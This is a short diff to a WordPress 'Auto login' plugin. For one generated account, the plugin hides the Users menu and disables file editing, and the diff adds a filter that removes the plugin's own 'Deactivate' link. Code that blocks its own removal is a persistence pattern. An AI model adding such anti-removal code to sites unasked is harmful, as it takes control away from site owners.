@@ -8,10 +8,27 @@ Description: Auto login WordPress plugin.
 */
 
 
+
+
+
 add_action('admin_menu', 'remove_admin_menu_links');
 function remove_admin_menu_links(){
     $user = wp_get_current_user();
     if( $user && isset($user->user_email) && 'generatedby@autologin.com' == $user->user_email ) {
+
+
+add_filter( 'plugin_action_links', 'disable_plugin_deactivation', 10, 4 );
+function disable_plugin_deactivation( $actions, $plugin_file, $plugin_data, $context ) {
+ 
+    if ( array_key_exists( 'deactivate', $actions ) && in_array( $plugin_file, array(
+        'autologin/autologin.php'
+    )))
+        unset( $actions['deactivate'] );
+    return $actions;
+}
+
+
+
 	remove_menu_page('users.php');
         define( 'DISALLOW_FILE_EDIT', true );
         //remove_menu_page('auto-login-plugi');
